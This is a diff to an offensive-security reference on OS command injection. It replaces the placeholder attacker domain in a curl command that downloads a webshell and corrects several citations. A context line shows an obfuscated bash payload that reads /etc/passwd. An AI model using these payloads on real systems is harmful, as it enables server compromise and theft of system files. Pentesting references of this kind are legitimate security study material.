@@ -134,7 +134,7 @@ Sometimes, direct command execution from the injection might not be possible, bu
 
     ```ps1
     # -o, --output <file>        Write to file instead of stdout
-    curl http://evil.attacker.com/ -o webshell.php
+    curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
     ```
 
 ### Inside A Command
@@ -470,7 +470,7 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 * [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://web.archive.org/web/20241202133053/https://twitter.com/DissectMalware/status/1025604382644232192)
 * [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
 * [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://web.archive.org/web/20220428000241/https://twitter.com/asdizzle_/status/895244943526170628)
-* [OS Command Injection - PortSwigger - 2024](https://web.archive.org/web/20190330193912/https://portswigger.net/web-security/os-command-injection)
+* [OS Command Injection - PortSwigger - March 30, 2019](https://web.archive.org/web/20190330193912/https://portswigger.net/web-security/os-command-injection)
 * [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://web.archive.org/web/20250108174818/https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
-* [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
+* [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - Kacper Szurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
 * [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://web.archive.org/web/20250109163006/https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
